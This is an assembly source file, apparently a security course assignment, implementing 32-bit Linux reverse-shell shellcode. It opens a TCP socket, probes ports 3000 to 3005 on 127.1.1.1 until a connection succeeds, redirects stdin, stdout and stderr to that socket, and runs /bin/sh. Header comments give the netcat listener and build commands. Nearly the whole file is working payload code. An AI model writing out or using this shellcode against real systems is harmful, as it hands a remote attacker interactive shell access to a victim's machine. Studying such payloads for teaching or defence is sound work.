; NOM / Prénom : NEHME Ali - MEZANI Nazim
; REVERSE SHELL ASM
; M1 - Sécurité - GR3
; ESGI
;

section .text
    global _start

; nc -l -p 3005 -s 127.1.1.1
; m2elf.pl -in test-asm.m (test-asm.m ==> shellcode)
; nasm -f elf32 portscan-shellcode.s && ld -m elf_i386 portscan-shellcode.o && strace ./a.out

_start:

    ;; Création de la socket
    sub eax, eax            ;; eax=0
    mov ax, 0x0167          ;; socket
    xor edx, edx            ;; protocole : The  protocol  specifies  a  particular  protocol to be used with the socket.  Normally only a single protocol exists to support a particular  socket type within a given protocol family, in which case protocol can be specified as 0.
    mov ecx, edx            ;; ecx=0
    inc ecx                 ;; type : SOCK_STREAM (TCP)
    mov ebx, ecx            ;; ebx=1
    inc ebx                 ;; domaine : AF_INET (IPv4)
    int 0x80                ;; cd 80

    mov ebx, eax        ;; 89 C3

    ; Scan de port + Connexion ----------------------------------------------------------------------------------------------------------------------
    xor esi, esi            ;; esi=0 && incrémente le port
    _while_port_scanning:   ; Scan port
        push 0x0101017f     ; IP : 127.1.1.1
        sub eax, eax        ;; eax=0 (si pas de connexion eax = 0xffffffff = -1) 

        mov di, 0x0bb8      ;; PORT = 3000 (pas de htons)
        add edi, esi        ;; Incrémentation du port avec esi
        rol di, 8           ;; Rotation de di (pour simuler le htons)
        push di             ;; Push du port dans la stack

        push word 0x2       ;; AF_INET (connexion)

        mov ax, 0x16a       ;; connect
        mov ecx, esp        ;; Struct sockaddr *addr
        mov dl, 0x10        ;; size de sockaddr *addr
        int 0x80            ;; Création de la connexion (eax = 0 si tout s'est bien passé)
   
        test eax, eax       ;; si il n'y a pas d'erreur, la connection a eut lieu. (_end_connect_to_ip_port)
        jnz _port_unused    ;; jump si le test != 0 => _port_unused
        jmp _end_connect_to_ip_port ;; eb 08
        
        _port_unused : 
            inc esi         ;; Incrémente esi
            cmp esi, 0x5    ;; Si il y a encore des "try", continuer dans le while (_while_port_scanning) sinon, quitter le programme (_no_port_to_connect_to_ip).
            jle _while_port_scanning    
            jmp _no_port_to_connect_to_ip   
        
        _end_connect_to_ip_port:


    push eax            ;; push 0 si connexion a été emise.
    push 0x68732f6e     ;; hs/n
    push 0x69622f2f     ;; ib//

    add al, 0x3         ;; Ajout de 3 dans al pour la boucle du dup2
    mov ecx, eax        ;; Remplace tout le contenu du registre "ecx" par 0x3

    ;; Dup2 (duplication) pour stdin, stdout, stderr (redirige la stdin-stdout-stderr de la victime vers ma machine)
    not_finish_dup:     ;; jump ==> 0xff - 0x06 => 0xf9 (0x06 == nombre de caractères pour atteindre le label "not_finish_dup")
    mov al, 0x3f        ;; dup2
    dec ecx             ;; stderr-stdout-stdin
    int 0x80            ;; 
    jnz not_finish_dup  ;; Si ecx != 0 => goto not_finish_dup

    ;; execve("/bin/sh", 0, 0) ==> eax=0x0b, ebx=/bin/sh, ecx=0, edx=0
    mov eax, ecx        ;; eax=0
    mov dl, 0x0b        ;; edx=0x0b
    xchg eax, edx       ;; eax=0x0b,edx=0       ;; Etant donné que mov eax, 0x0b (b0 03), la solution qu'on a trouvé est d'inverser le stockage des données pour eax & edx (vu que mov edx, 0x0b ==> b2 0b) puis de les remettre à leur place avec xchg 
    mov ebx, esp        ;; ebx=/bin/sh
    int 0x80            ;; 

    ;; Exit 0
    _no_port_to_connect_to_ip:
        xor eax, eax      ;; 
        inc eax           ;; 
        xor ebx, ebx      ;; 
        int 0x80          ;; 